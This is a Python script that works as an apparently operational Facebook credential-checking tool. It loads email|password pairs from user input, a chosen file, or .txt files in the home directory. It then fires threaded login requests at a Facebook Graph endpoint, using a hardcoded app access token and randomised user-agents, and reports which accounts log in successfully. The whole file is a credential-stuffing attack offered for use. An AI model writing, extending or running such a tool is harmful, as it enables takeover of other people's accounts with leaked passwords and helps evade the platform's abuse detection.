import os
import sys
import subprocess
import random
import threading
import time
import uuid

# Color codes
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
CYAN = '\033[1;96m'
RESET = '\033[0m'

# Ensure requests is installed
def check_install_requests():
    try:
        import requests
    except ImportError:
        print(f"{Y}Installing missing package 'requests'...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "requests"])
    finally:
        global requests
        import requests

check_install_requests()


# Generate random Windows user-agent
def W_ueragnt():
    chrome_version = random.randint(80, 99)
    webkit_version = random.randint(500, 599)
    safari_version = random.randint(400, 499)
    windows_version = random.randint(8, 10)
    is_win64 = random.choice([True, False])
    if is_win64:
        return f'Mozilla/5.0 (Windows NT {windows_version}.0; Win64; x64) AppleWebKit/{webkit_version}.0 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/{safari_version}.0'
    return 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'


# Safe device info fetch (simulate for non-Android)
def get_device_info():
    try:
        android_version = subprocess.check_output('getprop ro.build.version.release', shell=True).decode().strip()
        model = subprocess.check_output('getprop ro.product.model', shell=True).decode().strip()
    except:
        android_version = "11"
        model = "GenericDevice"
    return {
        'android_version': android_version,
        'model': model,
    }

device = get_device_info()


# Core login function
def cuser(user, passw, user_choice):
    accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
    device_id = str(uuid.uuid4())

    data = {
        "email": user,
        "password": passw,
        "access_token": accessToken,
        "device_id": device_id
    }

    headers = {
        "User-Agent": W_ueragnt(),
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        response = requests.post("https://graph.facebook.com/auth/login", headers=headers, data=data, timeout=30)
        res_json = response.json() if response.text else {}
        if "session_key" in res_json:
            print(f"{G}✅ Success -> {user}{RESET}")
        else:
            print(f"{R}❌ Failed -> {user}{RESET}")
    except Exception as e:
        print(f"{R}❌ Error -> {user}: {e}{RESET}")


# Manual input for single account
def Manual():
    user_choice = input(f"Input y (account) or n (page): ")
    user = input("USER ID/EMAIL: ")
    passw = input("PASSWORD: ")
    threading.Thread(target=cuser, args=(user, passw, user_choice)).start()


# Manual input from file
def ManFile():
    file = input('Enter file path: ')
    if os.path.isfile(file):
        user_choice = input(f"Input y (account) or n (page): ")
        with open(file, 'r') as f:
            for line in f:
                user_pass = line.strip().split('|')
                if len(user_pass) == 2:
                    threading.Thread(target=cuser, args=(user_pass[0], user_pass[1], user_choice)).start()
                    time.sleep(1)
                else:
                    print(f"{R}Invalid format in line: {line.strip()}{RESET}")
    else:
        print(f"{R}File not found!{RESET}")


# Auto-select .txt files from directory
def Auto():
    directory = os.path.expanduser('~')
    txt_files = [f for f in os.listdir(directory) if f.endswith('.txt')]
    if not txt_files:
        print(f"{R}No .txt files found in {directory}{RESET}")
        return

    for i, filename in enumerate(txt_files, start=1):
        print(f"{i}. {filename}")

    try:
        choice = int(input("Choose a file: "))
        if 1 <= choice <= len(txt_files):
            selected_file = os.path.join(directory, txt_files[choice - 1])
            if os.path.isfile(selected_file):
                user_choice = input(f"Input y (account) or n (page): ")
                with open(selected_file, 'r') as f:
                    for line in f:
                        user_pass = line.strip().split('|')
                        if len(user_pass) == 2:
                            threading.Thread(target=cuser, args=(user_pass[0], user_pass[1], user_choice)).start()
                            time.sleep(1)
                        else:
                            print(f"{R}Invalid format in line: {line.strip()}{RESET}")
        else:
            print(f"{R}Invalid choice{RESET}")
    except ValueError:
        print(f"{R}Invalid input{RESET}")


# Start menu
def start_tool():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("1. MANUAL INPUT")
    print("2. MANUAL FILE")
    print("3. AUTO FILE")
    print("0. EXIT")
    choice = input("Choose: ")
    if choice == '1':
        Manual()
    elif choice == '2':
        ManFile()
    elif choice == '3':
        Auto()
    elif choice == '0':
        sys.exit()
    else:
        print(f"{R}Invalid option{RESET}")


if __name__ == "__main__":
    start_tool()
